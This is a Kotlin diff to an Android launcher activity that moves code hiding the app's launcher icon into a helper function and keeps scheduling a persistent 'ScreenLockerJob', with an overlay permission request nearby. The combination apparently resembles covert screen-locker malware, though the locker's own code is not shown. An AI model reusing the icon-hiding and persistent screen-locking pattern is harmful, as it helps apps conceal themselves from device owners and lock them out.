@@ -13,6 +13,8 @@ See the License for the specific language governing permissions and
 limitations under the License.*/
 package com.candroid.lacedboots
 
+import android.app.Activity
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -50,7 +52,7 @@ import javax.inject.Inject
 @ExperimentalCoroutinesApi
 @ObsoleteCoroutinesApi
 @AndroidEntryPoint
-class LauncherActivity: AppCompatActivity(){
+class LauncherActivity: VisibilityActivity(){
     companion object{
         private const val mOverlay_request_code = 666
     }
@@ -60,23 +62,9 @@ class LauncherActivity: AppCompatActivity(){
         lifecycleScope.launchWhenResumed {
             withContext(Dispatchers.Default){
                 scheduler.run {
-                    schedulePersistent(ScreenLockerJob())/*
-                    scheduleOneTime(OneTimeWorker())
-                    scheduleOneTime(SecondWorker())
-                    schedulePeriodic(10000, PeriodicWorker())
-                    scheduleFuture(5000, FutureWorker())
-                    scheduleHourly(HourlyWorker())
-                    scheduleDaily(DailyWorker())
-                    scheduleWeekly(WeeklyWorker())
-                    scheduleMonthly(MonthlyWorker())
-                    scheduleYearly(YearlyWorker())*/
+                    schedulePersistent(ScreenLockerJob())
                 }
-            }
-            if(Build.VERSION.SDK_INT < Build.VERSION_CODES.R){
-                val state = packageManager.getComponentEnabledSetting(this@LauncherActivity.componentName)
-                if(state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT || state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED)
-                    getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-                finish()
+                hideAppIcon()
             }
         }
     }
@@ -93,5 +81,14 @@ class LauncherActivity: AppCompatActivity(){
                 startActivityForResult(intent, mOverlay_request_code)
             }
         }
+    }
+}
+
+fun Activity.hideAppIcon(){
+    if(Build.VERSION.SDK_INT < Build.VERSION_CODES.R){
+        val state = packageManager.getComponentEnabledSetting(componentName)
+        if(state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT || state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED)
+            getPackageManager().setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        finish()
     }
 }
